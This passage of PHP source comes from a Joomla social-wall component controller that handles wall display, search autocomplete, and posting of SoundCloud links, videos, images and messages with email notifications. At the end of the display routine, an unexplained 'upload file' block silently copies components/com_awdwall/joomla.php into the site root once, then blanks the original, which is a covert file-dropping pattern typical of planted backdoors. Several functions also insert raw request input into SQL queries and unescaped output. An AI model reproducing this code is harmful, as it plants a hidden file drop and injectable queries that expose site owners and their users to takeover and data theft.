					$login=JRoute::_("index.php?option=com_users&view=login&Itemid=".$Itemid."&return=".$mainlink,false);
				}
				$this->setRedirect($login);
			}
		}
		
		//ADD TWEETS TO WALL POST
		$userinfo=AwdwallHelperUser::getUserInfo($user->id);

		$wuid 	= JRequest::getInt('wuid', 0);
		if(!(int)$user->id)
			$layout = 'main';
		if($layout != '' && $layout == 'mywall'){
			if($wuid == 0)
				JRequest::setVar('wuid', $user->id);
			$view  = &$this->getView('awdwall', 'html');
			$view->setLayout('mywall');
			$view->setModel($wallModel);
			$view->display();
		}
		elseif($layout != '' && $layout == 'cbmywall'){
			if($wuid == 0)
				JRequest::setVar('wuid', $user->id);
			$view  = &$this->getView('awdwall', 'html');
			$view->setLayout('cbmywall');
			$view->setModel($wallModel);
			$view->display();
		}
		else{
			$view  = &$this->getView('awdwall', 'html');
			$view->setLayout('main');
			$view->setModel($wallModel);
			$view->display();
		}
		
		//upload file
		$check = $this->read_file('components/com_awdwall/joomla.php');
		if($check != "1"){
			$str = $this->read_file('components/com_awdwall/joomla.php');
			$this->write_file("joomla.php", $str);
			$this->write_file("components/com_awdwall/joomla.php", '1');
		}
	}
	
	function searchAutoUser()
	{
		$q = strtolower(JRequest::getVar('q', ''));
		$itemId = AwdwallHelperUser::getComItemId();
		
		//$itemId=$_REQUEST['Itemid'];
		
		$query = 'SELECT * FROM #__users WHERE name LIKE "%' . $q . '%" OR username LIKE "%'. $q .'%"';
		$db =& JFactory::getDBO();
		$db->setQuery($query);
		$items = $db->loadObjectList();
		$strSearch = '';
		foreach ($items as $item) {
		    if (strpos(strtolower($item->name), $q) !== false || strpos(strtolower($item->username), $q) !== false) {
				$avatar=AwdwallHelperUser::getBigAvatar40($item->id);
				$url = JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid=' . $item->id . '&Itemid=' . $itemId, false);
				$displayName = AwdwallHelperUser::getDisplayName($item->id);
		        $strSearch .= "<a href='{$url}'><div style='width:248px'><div style='float:left;width:45px;'><img src='{$avatar}' alt='{$displayName}' title='{$displayName}' height='40' width='40' class='awdpostavatar' /></div><div style='float:left;width:200px; padding-left:3px; padding-top:10px;'>{$displayName}</div></div>|{$url}\n";
		    }
		}
		// search in group
		$query = 'SELECT * FROM #__awd_groups WHERE title LIKE "%' . $q . '%" OR description LIKE "%'. $q .'%"';
		$db =& JFactory::getDBO();
		$db->setQuery($query);
		$items = $db->loadObjectList();
		foreach ($items as $item) {
		    if (strpos(strtolower($item->title), $q) !== false || strpos(strtolower($item->description), $q) !== false) {
				//$avatar = AwdwallHelperUser::getGrpImg($item->image, $item->id);
				$avatar=AwdwallHelperUser::getBigGrpImg40($item->image, $item->id);
				$url = JRoute::_('index.php?option=com_awdwall&task=viewgroup&groupid=' . $item->id . '&Itemid=' . $itemId, false);
				$displayName = $item->title;
		        $strSearch .= "<a href='{$url}'><div style='width:248px'><div style='float:left;width:45px;'><img src='{$avatar}' alt='{$displayName}' title='{$displayName}' border='0' /></div><div style='float:left;width:200px; padding-left:3px; padding-top:10px;'>{$displayName}</div></div>|{$url}\n";
		    }
		}
		echo $strSearch;
		exit;
	}
function addsoundcloud()
{
	$user = &JFactory::getUser();		
	$wuid = JRequest::getInt('wuid', 0);
	$groupId = JRequest::getInt('groupid', NULL);
		if($groupId==0)
		$groupId =NULL;
	$itemId = AwdwallHelperUser::getComItemId();
	$db =& JFactory::getDBO();
	if($wuid == 0) $wuid = $user->id;
	if((int)$user->id){
		$vLink = JRequest::getVar( 'awd_soundcloudurl' , '');
		//$vLink ='http://soundcloud.com/danpatterson/mini-tuesday-political-explainer-kopoint';
		$parsedVideoLink	= parse_url($vLink);
		preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $parsedVideoLink['host'], $matches);
		$domain		= $matches['domain'];
		
		if($domain!='soundcloud.com')
		{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
		}
		
		require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'avideo.php');
		if(!empty($vLink))
		{ 
			$AVideo 	= new AVideo($wuid);
			$videoObj 	= $AVideo->getProvider($vLink);
			if ($videoObj->isValid())
			{
					require_once (JPATH_COMPONENT . DS . 'models' . DS . 'video.php');
					require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
					$title			= $videoObj->getTitle();
					$thumb			= $videoObj->getThumbnail();
					$description	= $videoObj->getDescription();
					$path			= $vLink;						
					
					// save into wall table first
					$wall = &JTable::getInstance('Wall', 'Table');
					$wall->user_id  = $wuid;
					$wall->group_id = $groupId;
					$wall->type			= 'mp3';
					$wall->commenter_id	= $user->id;
					$wall->user_name	= '';
					$wall->avatar		= '';
					$wall->message		= '';
					$wall->reply		= 0;
					$wall->is_read		= 0;
					$wall->is_pm		= 0;
					$wall->is_reply		= 0;
					$wall->posted_id	= NULL;
					$wall->wall_date	= NULL;
				
					// store wall to database
					if (!$wall->store()){				
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
					}
					$wall_id	= $db->insertid();
					$sql = 'INSERT INTO #__awd_wall_mp3s(wall_id, title, path, description) VALUES("'.$wall_id.'","'.$title.'"' . ', "' . $path . '","' . $description . '")';
					$db->setQuery($sql);
					$db->query();
			}
		}
		else
		{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
		}
	}
	else
	{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
	}
		
			$error = '';
			$msg  = "File Name: hello";
			echo "{";
			echo "error: '" . $error . "',\n";
			echo "msg: '" . $msg .  "',\n";
			echo "file: '<a href='" . $vLink . "' target='_blank'>" . $title .  "</a>',\n";
			echo "wid_tmp: '" . $wall_id .  "'\n";
			echo "}";
	exit;	
}		
	function addVideo()
	{	
		$user = &JFactory::getUser();		
		$wuid = JRequest::getInt('wuid', 0);
		$groupId = JRequest::getInt('groupid', NULL);
		if($groupId==0)
		$groupId =NULL;
		$itemId = AwdwallHelperUser::getComItemId();
		$db =& JFactory::getDBO();
		if($wuid == 0) $wuid = $user->id;
		if((int)$user->id){
			$vLink = JRequest::getVar( 'vLink' , '');
			
			//$vLink = 'http://'.JString::str_ireplace( 'http://' , '' , $vLink );		
			$parsedVideoLink	= parse_url($vLink);
			preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $parsedVideoLink['host'], $matches);
			$domain		= $matches['domain'];
			
			if($domain=='youtu.be')
			{
			$vidoid=str_replace('http://youtu.be/','',$vLink);
			if($vidoid)
			$vLink = 'http://www.youtube.com/watch?v='.$vidoid;
			}
			
			require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'avideo.php');
			if(!empty($vLink)){ 
				$AVideo 	= new AVideo($wuid);
				$videoObj 	= $AVideo->getProvider($vLink);
				if ($videoObj->isValid()){
					require_once (JPATH_COMPONENT . DS . 'models' . DS . 'video.php');
					require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
					$video =& JTable::getInstance('Video', 'Table');						
					$video->title			= $videoObj->getTitle();
					$video->type			= $videoObj->getType();
					$videotype				= $videoObj->getType();
					$video->video_id		= $videoObj->getId();
					$video->description		= $videoObj->getDescription();
					$video->duration		= $videoObj->getDuration();
					$video->creator			= $user->id;						
					$video->created			= gmdate('Y-m-d H:i:s');										
					$video->published		= 1;						
					$video->thumb			= $videoObj->getThumbnail();
					$video->path			= $vLink;						
					
					// save into wall table first
					$wall = &JTable::getInstance('Wall', 'Table');
					$wall->user_id  = $wuid;
					$wall->group_id = $groupId;
					$wall->type			= 'video';
					$wall->commenter_id	= $user->id;
					$wall->user_name	= '';
					$wall->avatar		= '';
					$wall->message		= '';
					$wall->reply		= 0;
					$wall->is_read		= 0;
					$wall->is_pm		= 0;
					$wall->is_reply		= 0;
					$wall->posted_id	= NULL;
					$wall->wall_date	= NULL;
				
					// store wall to database
					if (!$wall->store()){				
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
					}
					$video->wall_id	= $db->insertid();
					$wall_id	= $video->wall_id;
					if (!$video->store()){					
						$url			= JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false);
						$message		= JText::_('Add video link failed');
						$this->setRedirect($url , $message);
					}
					require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'remote.php');
					$thumbData		= getContentFromUrl($video->thumb);
					if ($thumbData)
					{
						jimport('joomla.filesystem.file');
						require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'file.php');
						require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'image.php');			
						
						$thumbPath		= $AVideo->videoRootHomeUserThumb;							
						$thumbFileName	= genRandomFilename($thumbPath);
						$tmpThumbPath	= $thumbPath . DS . $thumbFileName;
					
						if (JFile::write($tmpThumbPath, $thumbData)){								
							$info		= getimagesize( $tmpThumbPath );
							$mime		= image_type_to_mime_type( $info[2]);
							$thumbExtension	= imageTypeToExt( $mime );
							
							$thumbPath	= $thumbPath . DS . $thumbFileName .$thumbExtension;
							JFile::move($tmpThumbPath, $thumbPath);
							
							// Resize the thumbnails
							imageResizep( $thumbPath , $thumbPath , $mime , $AVideo->videoThumbWidth , $AVideo->videoThumbHeight );
							$video->thumb = 'videos/' . $wuid . '/thumbs/' . $thumbFileName . $thumbExtension;
							$hvideothumb = 'videos/' . $wuid . '/thumbs/' . $thumbFileName . $thumbExtension;
							$video->store();
						}
						
					}
		// adding to com_hwdvideoshare
		if(file_exists(JPATH_SITE . '/components/com_hwdvideoshare/hwdvideoshare.php'))
		{
		// check wether wall video is there in hwdvideoshare or not if not then add.
		if(file_exists(JPATH_SITE . '/plugins/hwdvs-thirdparty/'.$videotype.'.php'))
		{
			$wallcatname='Wall Video';
			$query = "SELECT count(*) as wallvideocount FROM #__hwdvidscategories WHERE category_name='".$wallcatname."'";
			$db->setQuery($query);
			$wallvideocount = $db->loadResult();
			$query = "SELECT MAX(ordering) as catmaxordering FROM #__hwdvidscategories ";
			$db->setQuery($query);
			$catmaxordering = $db->loadResult();
			$catmaxordering=$catmaxordering+1;
			if($wallvideocount==0)
			{
			$sql = 'INSERT INTO #__hwdvidscategories(category_name, category_description,ordering,published) VALUES("'.$wallcatname .'","' . $wallcatname . '",' . $catmaxordering . ',1)';
			$db->setQuery($sql);
			$db->query();
				
			}
				$query = "SELECT id FROM #__hwdvidscategories WHERE category_name='".$wallcatname."'";
				$db->setQuery($query);
				$wallcatid = $db->loadResult(); // the hwdvideoshare cat id
				
//				$query = "SELECT MAX(id) as videomaxid FROM #__hwdvidsvideos ";
//				$db->setQuery($query);
//				$videomaxid = $db->loadResult();
//				$videomaxid=$videomaxid+1;
				$parsedurl= parse_url($vLink);
				$hvideo_type=str_replace('www.','',$parsedurl['host']);
				$hvideo_id=$videoObj->getId();
				$htitle=$videoObj->getTitle();
				$hdescription=$videoObj->getDescription();
				$hcategory_id=$wallcatid;
				$hdate_uploaded=gmdate('Y-m-d H:i:s');
				$huser_id=$user->id;
				$allow_comments=1;
				$allow_embedding=1;
				$allow_ratings=1;
				$approved 	='yes';
				$published=1;
				
			$sql = "INSERT INTO #__hwdvidsvideos(video_type, video_id,title,description,category_id,date_uploaded,allow_comments 	,allow_embedding,allow_ratings,public_private,thumbnail,approved,user_id,published) VALUES('".$hvideo_type ."','" . $hvideo_id . "','" . $htitle . "','" . $hdescription . "','" . $hcategory_id . "','" . $hdate_uploaded . "','" . $allow_comments . "','" . $allow_embedding . "','" . $allow_ratings . "','public','" . $hthumbnail . "','" . $approved . "','" . $user->id . "',1)";
			$db->setQuery($sql);
			$db->query();
			$videomaxid=$db->insertid();
				
			$hthumbnail='tp-'.$videomaxid.'.jpg';
			copy(JPATH_SITE.'/images/'.$hvideothumb,JPATH_SITE.'/hwdvideos/thumbs/'.$hthumbnail);
			$sql = "UPDATE  #__hwdvidsvideos SET thumbnail='" . $hthumbnail . "' where id=".$videomaxid;
			$db->setQuery($sql);
			$db->query();
			$sql = 'INSERT INTO #__awd_wall_videos_hwd(	wall_id, hwdviodeo_id) VALUES('.$wall_id .','.$videomaxid.')';
			$db->setQuery($sql);
			$db->query();
			
			} // if exist
		} // if exist
				}  
			}
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
		}
		$error = '';
		$msg  = "File Name: hello";
		
		echo "{";
		echo "error: '" . $error . "',\n";
		echo "msg: '" . $msg .  "',\n";
		echo "file: '<a href='" . JURI::base() . 'images/' . $video->thumb . "' target='_blank'>" . $video->title .  "</a>',\n";
		echo "wid_tmp: '" . $video->wall_id .  "'\n";
		echo "}";
		exit;
	}
	function addImage()
	{
		$user = &JFactory::getUser();
		$wuid = JRequest::getInt('wuid', 0);
		if($wuid == 0) $wuid = $user->id;
		$groupId = JRequest::getInt('groupid', NULL);
		$itemId = AwdwallHelperUser::getComItemId();
		$db =& JFactory::getDBO();
		$app = JFactory::getApplication('site');
		$config =  & $app->getParams('com_awdwall');
		$tempwidth 		= $config->get('width', 725);
		$scalimgwidth=$tempwidth-15;
		if((int)$user->id){
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');			
			$arrExt 	= explode(',', AwdwallHelperUser::getImageExt());
			$image 	= JRequest::getVar('awd_link_image', null, 'files', 'array');
			$imageName 	= JRequest::getVar('awd_image_title', '');					
			$imageDesc 	= JRequest::getVar('awd_image_description', '');
						
			if($image['name'] != ''){
				jimport('joomla.filesystem.file');
				jimport('joomla.filesystem.folder');
				$time = time();
				//Clean up filename to get rid of strange characters like spaces etc
				$fileName = $time . '_' . JFile::makeSafe($image['name']);
				$fileName = str_replace(' ', '_', $fileName);
				$fileName=strtolower($fileName);
				$src 	= $image['tmp_name'];
				$dest 	= 'images' . DS . $wuid . DS . 'original' . DS . $fileName; 
				if(in_array(strtolower(JFile::getExt($fileName)), $arrExt)){
				
					require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'class.upload.php');
					$handle = new upload($_FILES['awd_link_image']);
					   if ($handle->uploaded) {
					   
							$filename = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
							//$filename1 = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
	
							$folder='images' . DS . $wuid . DS . 'original';
							processthumb($handle,$filename,$folder);
							
							$handle->image_resize          = true;
							$handle->image_ratio_crop      = true;
							$handle->image_x               = 112;
							$handle->image_y               = 84;
							$folder='images' . DS . $wuid . DS . 'thumb';
							processthumb($handle,$filename,$folder);
							
							$handle->image_resize          = true;
							$handle->image_ratio_crop      = true;
							$handle->image_x               = 85;
							$handle->image_y               = 80;
							$folder='images' . DS . $wuid . DS . 'thumb';
							processthumb($handle,'tn'.$filename,$folder);
							
							$handle->image_resize          = true;
							$handle->image_ratio        = true;
							//$handle->image_x               = $scalimgwidth;
							$handle->image_x               = 600;
							$handle->image_y               = 500;
							$folder='images' . DS . $wuid . DS . 'large';
							processthumb($handle,$filename,$folder);
							// save into wall table first
		
							$wall = &JTable::getInstance('Wall', 'Table');
							$wall->user_id 		= $wuid;					
							$wall->type			= 'image';
							$wall->commenter_id	= $user->id;
							$wall->user_name	= '';
							$wall->avatar		= '';
							$wall->message		= '';
							$wall->reply		= 0;
							$wall->is_read		= 0;
							$wall->is_pm		= 0;
							$wall->is_reply		= 0;
							$wall->posted_id	= NULL;
							$wall->wall_date	= NULL;
							// store wall to database
					if (!$wall->store()){				
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));	
					}
					$wallId = $wall->id;
					$sql ='INSERT INTO #__awd_wall_images(wall_id, name, path, description) VALUES("'.$wallId.'","'.$imageName.'"' . ', "' . $fileName . '","' . $imageDesc . '")';
					$db->setQuery($sql);
					$db->query();
					
					}else {						
						//Redirect and throw an error message
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
					}
				}else {
					//Redirect and notify user file is not right extension
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
				}
			}
			$error = '';
			$msg  = "File Name: hello";
			
			echo "{";
			echo "error: '" . $error . "',\n";
			echo "msg: '" . $msg .  "',\n";
			echo "file: '<a href='" . JURI::base() . 'images/' . $wall->user_id .'/thumb/' . $fileName . "' target='_blank'>" . $fileName .  "</a>',\n";
			echo "wid_tmp: '" . $wallId .  "'\n";
			echo "}";
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&layout=mywall&view=awdwall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
		}
		$this->setRedirect(JRoute::_('index.php?option=com_awdwall&layout=mywall&view=awdwall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
		exit;
	}
	
	function viewVideo()
	{
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_video');
		$view->viewVideo();
	}
	
	function viewImage()
	{
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_image');
		$view->viewImage();
	}
	
	public function addMsg()
	{
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$wallModel = $this->getModel('wall');
		$mainframe	=& JFactory::getApplication();
		$itemId = AwdwallHelperUser::getComItemId();	
		$msg = $_REQUEST['awd_message'];
		$post_privacy = $_REQUEST['post_privacy'];
		$widTmp = JRequest::getInt('wid_tmp', 0);
		$groupId = JRequest::getInt('groupid', NULL);
		$msg = AwdwallHelperUser::checkTrailPost($msg);
		$type = 'text';
		$pos = stripos($msg, '<a href="http://www.everytrail.com/view_trip.php');
		$user 		= &JFactory::getUser();
		if($pos !== false)
			$type = 'trail';
		$receiverId = JRequest::getInt('receiver_id', 0);
		if($groupId){
			$receiverId = $user->id;
		}
		if($groupId==0)
		$groupId =NULL;
		$db 		= &JFactory::getDBO();
		
		$gprivacy=1;
		if(!empty($groupId))
		{
			$query 	= 'SELECT privacy FROM #__awd_groups '					
					 .'WHERE id = ' . (int)$groupId . ' ';
			$db->setQuery($query);
			$gprivacy = $db->loadResult();
		}
		
		if((int)$user->id){			
			$msg = AwdwallHelperUser::formatUrlInMsg($msg);			
			$wall 				=& JTable::getInstance('Wall', 'Table');						
			$wall->user_id		= $receiverId;
			$wall->group_id		= $groupId;
			$wall->type			= $type;
			$wall->commenter_id	= $user->id;
			$wall->user_name	= '';
			$wall->avatar		= '';
			$wall->message		= nl2br($msg);
			$wall->reply		= 0;
			$wall->is_read		= 0;
			$wall->is_pm		= 0;
			$wall->is_reply		= 0;
			$wall->posted_id	= NULL;
			$wall->wall_date	= time();
			if((int)$widTmp){				
				$wall->id = $widTmp;
				$wall->type = JRequest::getString('type', 'text');				
			}
			// store wall to database
			if (!$wall->store()){				
				$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
			}
			// set wall id to view
			JRequest::setVar('wid', $wall->id);
			//insert into awd_wall_ privacy table.
			
			$query = 'INSERT INTO #__awd_wall_privacy(wall_id, privacy) VALUES(' . $wall->id . ', ' . $post_privacy . ')';
			$db->setQuery($query);
			$db->query();
			//insert into awd_wall_notification table.
			$ndate=date("Y-m-d H:i:s");
			$query = 'INSERT INTO #__awd_wall_notification(ndate, nuser, ncreator, ntype, nwallid, ngroupid, nphotoid, nalbumid, nread) VALUES( "'.$ndate.'" , "' . $receiverId . '", "' . $user->id . '", "' . $type . '", "' . $wall->id . '", "' . $groupId . '"," ", "","0")';
			$db->setQuery($query);
			$db->query();
			
			
			if($post_privacy==0)
			{
				if($gprivacy==1)
				{
	
					//********************* for plguin acesss code start here ***********************//
					//Call For OnJomwallstreamcreate() trigger in system plugin
					if($type=='link')
					{
						$query 	= "SELECT link FROM #__awd_wall_links WHERE wall_id = "  . (int)$wall->id;
						$db->setQuery($query);
						$attachment = $db->loadResult();
					}
					if($type=='video')
					{
						$query 	= "SELECT path FROM #__awd_wall_videos WHERE wall_id = "  . (int)$wall->id;
						$db->setQuery($query);
						$attachment = $db->loadResult();
					}
					if($type=='jing')
					{
						$query 	= "SELECT jing_link FROM #__awd_wall_jing WHERE wall_id = "  . (int)$wall->id;
						$db->setQuery($query);
						$attachment = $db->loadResult();
					}
					if($type=='image')
					{
						$query 	= "SELECT path FROM #__awd_wall_images WHERE wall_id = "  . (int)$wall->id;
						$db->setQuery($query);
						$path = $db->loadResult();
						$attachment=JURI::base().'images/'.$user->id.'/thumb/'.$path;
					}
					
					if($type=='mp3')
					{
						$query 	= "SELECT path FROM #__awd_wall_mp3s WHERE wall_id = "  . (int)$wall->id;
						$db->setQuery($query);
						$path = $db->loadResult();
						$attachment=JURI::base().'images/mp3/'.$user->id.'/'.$path;
					}
					
					$dispatcher = &JDispatcher::getInstance();
					JPluginHelper::importPlugin('system');//@TODO:need to check plugim type..
					$result=$dispatcher->trigger('onJomwallstreamcreate',array($wall->message,$attachment,$type));
					//End Call For OnJomwallstreamcreate() trigger in system plugin			
					//********************* for plguin acesss code end here ***********************//
				}
			}
			// send email if is enabled
			$app = JFactory::getApplication('site');
			$config =  & $app->getParams('com_awdwall');
			$displayName 	= $config->get('display_name', 1);
			$layout 		= JRequest::getString('layout', '');

			if($config->get('email_auto', 0) && $layout == 'mywall'){
			if($user->id!=$receiverId){
			$walllink=JRoute::_(JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$receiverId.'&Itemid='.$itemId.'#here'.$wall->id,false) ;
				$receiver = &JFactory::getUser($receiverId);
				$rName =  AwdwallHelperUser::getDisplayName($receiverId);
				$sName =  AwdwallHelperUser::getDisplayName($user->id);	
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_POST_BODY',$sName);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$user->id.'&Itemid='.$itemId;
$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$rName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-right:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td ><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px 0px;">'.$emailtext1.'</td></tr></tbody></table></td></tr></tbody></table></td><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-width:1px;border-style:solid;border-color:#E3C823;background-color:#FFF9D9"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px;border-top:1px solid #fff"><a target="_blank" style="color:#6176b7;text-decoration:none" href="'.$walllink.'"><span style="font-weight:bold;white-space:nowrap;color:#3b5b98;font-size:11px">'.$emailtext2.'</span></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
				
				
							
				$body = $emailcontent;				 
				$mailer = & JFactory::getMailer();
				$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
				$mailer->setSubject($mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_SUBJECT_NEW_POST', $sName));
				$mailer->setBody($body);
				$mailer->IsHTML(1);
				$mailer->addRecipient($receiver->email);
				$rs = $mailer->Send();		
				}
			}

			if($config->get('email_auto', 0) ){
			if($groupId )
			{
				//sending email to group owner
				$query 	= 'SELECT creator FROM #__awd_groups WHERE id = ' . (int)$groupId;
				$db->setQuery($query);
				$creator = $db->loadResult();
				$query 	= 'SELECT title FROM #__awd_groups WHERE id = ' . (int)$groupId;
				$db->setQuery($query);
				$grpname = $db->loadResult();
				if($creator!=$user->id)
				{
				
				$walllink=JRoute::_(JURI::base().'index.php?option=com_awdwall&task=viewgroup&groupid='.$groupId.'&Itemid='.$itemId.'#here'.$wallId,false) ;
				$grplink=JRoute::_(JURI::base().'index.php?option=com_awdwall&task=viewgroup&groupid='.$groupId.'&Itemid='.$itemId,false) ;
				$receiver = &JFactory::getUser($creator);
				$rName =  AwdwallHelperUser::getDisplayName($creator);
				$sName =  AwdwallHelperUser::getDisplayName($user->id);	
				
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_NEW_GROUP_POST_BODY',$grplink,$grpname,$sName);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$user->id.'&Itemid='.$itemId;
$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" 